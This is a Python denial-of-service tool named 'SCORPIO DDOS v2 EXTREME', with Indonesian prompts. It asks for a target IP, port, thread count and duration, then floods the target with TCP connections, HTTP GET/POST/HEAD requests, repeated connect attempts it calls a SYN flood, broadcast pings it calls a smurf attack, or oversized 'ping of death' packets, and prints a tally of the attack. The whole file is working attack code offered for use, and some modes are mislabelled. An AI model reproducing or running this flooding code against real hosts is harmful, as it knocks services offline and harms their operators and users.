import socket, threading, random, time, os, requests

def start_attack():
    os.system('clear')
    print("\nSCORPIO DDOS v2 EXTREME | by Mr.kodomoXploit\n")

    target = input("Target IP: ").strip()
    if not target.replace('.', '').isdigit():
        print("[!] Masukkan IP valid, bukan URL!\n")
        return start_attack()

    try:
        port = int(input("Port (80/443): "))
        method = input("Metode (tcp/http/get/post/head/syn/smurf/pingdeath): ").strip().lower()
        threads = int(input("Jumlah Threads: "))
        duration = int(input("Durasi Serangan (detik): "))
    except:
        print("[!] Input tidak valid!")
        return start_attack()

    valid_methods = ["tcp", "http", "get", "post", "head", "syn", "smurf", "pingdeath"]
    if method not in valid_methods:
        print(f"[!] Metode '{method}' tidak dikenali!\nGunakan: {', '.join(valid_methods)}")
        return start_attack()

    timeout = time.time() + duration
    sent_success, sent_failed = 0, 0
    lock = threading.Lock()

    def tcp_flood():
        nonlocal sent_success, sent_failed
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + bytes(target, 'utf-8') + b"\r\n\r\n")
                s.close()
                with lock: sent_success += 1
            except:
                with lock: sent_failed += 1

    def http_request(type_):
        nonlocal sent_success, sent_failed
        url = f"http://{target}:{port}"
        while time.time() < timeout:
            try:
                if type_ == "get":
                    requests.get(url, timeout=1)
                elif type_ == "post":
                    requests.post(url, data={"x": random.randint(0,999)}, timeout=1)
                elif type_ == "head":
                    requests.head(url, timeout=1)
                with lock: sent_success += 1
            except:
                with lock: sent_failed += 1

    def syn_flood():
        nonlocal sent_success, sent_failed
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect_ex((target, port))
                with lock: sent_success += 1
            except:
                with lock: sent_failed += 1

    def smurf_attack():
        nonlocal sent_success, sent_failed
        while time.time() < timeout:
            try:
                os.system(f"ping -b -c 1 {target} > /dev/null 2>&1")
                with lock: sent_success += 1
            except:
                with lock: sent_failed += 1

    def ping_of_death():
        nonlocal sent_success, sent_failed
        while time.time() < timeout:
            try:
                os.system(f"ping -s 65507 {target} -c 1 > /dev/null 2>&1")
                with lock: sent_success += 1
            except:
                with lock: sent_failed += 1

    print(f"\n[!] Menyerang {target}:{port} dengan metode {method.upper()} selama {duration} detik pakai {threads} threads...\n")

    for _ in range(threads):
        if method == "tcp":
            threading.Thread(target=tcp_flood).start()
        elif method in ["http", "get", "post", "head"]:
            tipe = method if method != "http" else "get"
            threading.Thread(target=http_request, args=(tipe,)).start()
        elif method == "syn":
            threading.Thread(target=syn_flood).start()
        elif method == "smurf":
            threading.Thread(target=smurf_attack).start()
        elif method == "pingdeath":
            threading.Thread(target=ping_of_death).start()

    while time.time() < timeout:
        time.sleep(1)

    total = sent_success + sent_failed
    print("\n--- Laporan Serangan ---")
    print(f"Target     : {target}:{port}")
    print(f"Metode     : {method.upper()}")
    print(f"Threads    : {threads}")
    print(f"Durasi     : {duration} detik")
    print(f"✓ Sukses   : {sent_success} serangan berhasil")
    print(f"✗ Gagal    : {sent_failed} serangan gagal")
    print(f"Σ Total    : {total} serangan terkirim")
    print("--- SCORPIO DDOS EXTREME by Mr.komodoXploit ---\n")

    next_action = input("Tekan [Enter] untuk kembali ke menu, [Y] untuk ulangi target, atau [X] untuk keluar: ").strip().lower()
    if next_action == "y":
        start_attack()
    elif next_action == "x":
        print("Keluar...")
        exit()
    else:
        start_attack()

start_attack()